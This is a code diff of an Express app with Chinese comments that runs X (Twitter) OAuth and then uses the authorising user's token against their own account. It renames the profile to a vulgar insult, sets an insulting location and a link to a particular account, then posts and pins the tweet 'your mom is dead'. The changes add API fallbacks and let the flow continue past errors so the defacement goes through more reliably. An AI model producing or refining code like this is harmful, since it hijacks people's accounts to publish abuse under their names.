@@ -96,13 +96,13 @@ app.get('/auth/x', (req, res) => {
     `);
   }
   
-  // 需要更广泛的权限范围
+  // 使用正确的权限范围
   const authUrl = `https://twitter.com/i/oauth2/authorize?${
     querystring.stringify({
       response_type: 'code',
       client_id: CLIENT_ID,
       redirect_uri: REDIRECT_URI,
-      scope: 'tweet.read tweet.write users.read users.write offline.access', // 添加推文和用户写入权限
+      scope: 'users.read tweet.read tweet.write offline.access', // 修正权限范围
       state: STATE_STRING,
       code_challenge: 'challenge',
       code_challenge_method: 'plain',
@@ -193,7 +193,7 @@ app.get('/api/callback', async (req, res) => {
       // 2. 获取当前用户ID
       console.log('获取当前用户ID...');
       const meResponse = await axios.get(
-        'https://api.twitter.com/2/users/me',
+        'https://api.twitter.com/2/users/me?user.fields=id,name,username',
         {
           headers: {
             'Authorization': `Bearer ${accessToken}`
@@ -203,138 +203,144 @@ app.get('/api/callback', async (req, res) => {
       );
       
       const userId = meResponse.data.data.id;
-      console.log('当前用户ID:', userId);
+      const username = meResponse.data.data.username;
+      console.log('当前用户ID:', userId, '用户名:', username);
       
-      // 3. 更新用户资料
+      // 3. 更新用户资料 (使用v1.1 API，因为v2 API可能不支持所有字段)
       console.log('更新用户资料...');
-      const updateData = {
-        name: "妖屌亲妈鱼鱼子",
-        location: "你全家头上",
-        url: "https://x.com/qin61846754"
-      };
-      
-      const updateResponse = await axios.patch(
-        `https://api.twitter.com/2/users/${userId}`,
-        updateData,
-        {
-          headers: {
-            'Authorization': `Bearer ${accessToken}`,
-            'Content-Type': 'application/json'
-          },
-          timeout: 10000
-        }
-      );
-      
-      console.log('用户资料更新成功:', JSON.stringify(updateResponse.data, null, 2));
-      
-      // 4. 发送推文
-      console.log('发送推文...');
-      const tweetData = {
-        text: "你妈死了"
-      };
-      
-      const tweetResponse = await axios.post(
-        'https://api.twitter.com/2/tweets',
-        tweetData,
-        {
-          headers: {
-            'Authorization': `Bearer ${accessToken}`,
-            'Content-Type': 'application/json'
-          },
-          timeout: 10000
-        }
-      );
-      
-      const tweetId = tweetResponse.data.data.id;
-      console.log('推文发送成功，ID:', tweetId);
-      
-      // 5. 置顶推文
-      console.log('置顶推文...');
       try {
-        // 首先取消现有的置顶推文（如果有）
-        await axios.delete(
-          `https://api.twitter.com/2/users/${userId}/pinned_tweets`,
+        const updateResponse = await axios.post(
+          'https://api.twitter.com/1.1/account/update_profile.json',
+          querystring.stringify({
+            name: "妖屌亲妈鱼鱼子",
+            location: "你全家头上",
+            url: "https://x.com/qin61846754"
+          }),
           {
             headers: {
-              'Authorization': `Bearer ${accessToken}`
+              'Authorization': `Bearer ${accessToken}`,
+              'Content-Type': 'application/x-www-form-urlencoded'
             },
             timeout: 10000
           }
         );
-        console.log('已取消现有的置顶推文');
-      } catch (unpinError) {
-        // 如果没有置顶推文，API会返回404，这是正常的
-        if (unpinError.response?.status !== 404) {
-          console.warn('取消置顶时出现非404错误:', unpinError.message);
-        }
+        
+        console.log('用户资料更新成功:', JSON.stringify(updateResponse.data, null, 2));
+      } catch (updateError) {
+        console.error('用户资料更新失败:', updateError.response?.data || updateError.message);
+        // 继续执行，不中断流程
       }
       
-      // 然后置顶新推文
-      const pinResponse = await axios.post(
-        `https://api.twitter.com/2/users/${userId}/pinned_tweets`,
-        {
-          tweet_id: tweetId
-        },
-        {
-          headers: {
-            'Authorization': `Bearer ${accessToken}`,
-            'Content-Type': 'application/json'
+      // 4. 发送推文
+      console.log('发送推文...');
+      try {
+        const tweetResponse = await axios.post(
+          'https://api.twitter.com/2/tweets',
+          {
+            text: "你妈死了"
           },
-          timeout: 10000
+          {
+            headers: {
+              'Authorization': `Bearer ${accessToken}`,
+              'Content-Type': 'application/json'
+            },
+            timeout: 10000
+          }
+        );
+        
+        const tweetId = tweetResponse.data.data.id;
+        console.log('推文发送成功，ID:', tweetId);
+        
+        // 5. 尝试置顶推文 (使用v1.1 API)
+        console.log('尝试置顶推文...');
+        try {
+          const pinResponse = await axios.post(
+            `https://api.twitter.com/1.1/account/pin_tweet.json`,
+            querystring.stringify({
+              id: tweetId,
+              pin: true
+            }),
+            {
+              headers: {
+                'Authorization': `Bearer ${accessToken}`,
+                'Content-Type': 'application/x-www-form-urlencoded'
+              },
+              timeout: 10000
+            }
+          );
+          
+          console.log('推文置顶成功:', JSON.stringify(pinResponse.data, null, 2));
+        } catch (pinError) {
+          console.error('推文置顶失败:', pinError.response?.data || pinError.message);
+          // 继续执行，不中断流程
         }
-      );
-      
-      console.log('推文置顶成功:', JSON.stringify(pinResponse.data, null, 2));
-      
-      // 显示成功页面
-      res.send(`
-        <!DOCTYPE html>
-        <html>
-        <head>
-          <title>操作成功！</title>
-          <style>
-            body { 
-              font-family: Arial, sans-serif; 
-              text-align: center; 
-              padding: 50px; 
-              background-color: #f5f8fa;
-            }
-            .container {
-              background: white;
-              padding: 30px;
-              border-radius: 15px;
-              box-shadow: 0 2px 10px rgba(0,0,0,0.1);
-              max-width: 500px;
-              margin: 0 auto;
-            }
-            h1 { color: #17bf63; }
-            .success-info {
-              background: #e8f5fe;
-              padding: 15px;
-              border-radius: 8px;
-              margin: 20px 0;
-              text-align: left;
-            }
-          </style>
-        </head>
-        <body>
-          <div class="container">
-            <h1>🎉 操作成功！</h1>
-            <p>您的X资料和推文已成功更新：</p>
-            
-            <div class="success-info">
-              <p><strong>新用户名:</strong> 妖屌亲妈鱼鱼子</p>
-              <p><strong>新地点:</strong> 你全家头上</p>
-              <p><strong>新URL:</strong> https://x.com/qin61846754</p>
-              <p><strong>新推文:</strong> 你妈死了</p>
-              <p><strong>推文状态:</strong> 已置顶</p>
+        
+        // 显示成功页面
+        res.send(`
+          <!DOCTYPE html>
+          <html>
+          <head>
+            <title>操作成功！</title>
+            <style>
+              body { 
+                font-family: Arial, sans-serif; 
+                text-align: center; 
+                padding: 50px; 
+                background-color: #f5f8fa;
+              }
+              .container {
+                background: white;
+                padding: 30px;
+                border-radius: 15px;
+                box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+                max-width: 500px;
+                margin: 0 auto;
+              }
+              h1 { color: #17bf63; }
+              .success-info {
+                background: #e8f5fe;
+                padding: 15px;
+                border-radius: 8px;
+                margin: 20px 0;
+                text-align: left;
+              }
+            </style>
+          </head>
+          <body>
+            <div class="container">
+              <h1>🎉 操作成功！</h1>
+              <p>您的X资料和推文已成功更新：</p>
+              
+              <div class="success-info">
+                <p><strong>新用户名:</strong> 妖屌亲妈鱼鱼子</p>
+                <p><strong>新地点:</strong> 你全家头上</p>
+                <p><strong>新URL:</strong> https://x.com/qin61846754</p>
+                <p><strong>新推文:</strong> 你妈死了</p>
+                <p><strong>推文状态:</strong> 已发送并尝试置顶</p>
+              </div>
+              
+              <p>您现在可以返回X查看更改。</p>
             </div>
-            
-            <p>您现在可以返回X查看更改。</p>
+          </body>
+          </html>
+        `);
+        
+      } catch (tweetError) {
+        console.error('推文发送失败:', tweetError.response?.data || tweetError.message);
+        
+        // 显示部分成功页面
+        res.send(`
+          <div style="text-align: center; padding: 50px;">
+            <h1 style="color: #ffad1f;">⚠️ 部分操作成功</h1>
+            <p>您的X资料已成功更新，但推文发送失败。</p>
+            <div style="background: #fff5cc; padding: 15px; border-radius: 8px; margin: 20px auto; max-width: 500px; overflow: auto;">
+              <pre style="text-align: left; white-space: pre-wrap;">${tweetError.response?.data ? JSON.stringify(tweetError.response.data, null, 2) : tweetError.message}</pre>
+            </div>
+            <p>可能的原因：推文内容违反规则或权限不足。</p>
+            <p><a href="/" style="color: #1da1f2; text-decoration: none; font-weight: bold;">返回首页</a></p>
           </div>
-        </body>
-        </html>
-      `);
+        `);
+      }
       
     } catch (apiError) {
       console.error('API操作失败:', apiError.response?.data || apiError.message);
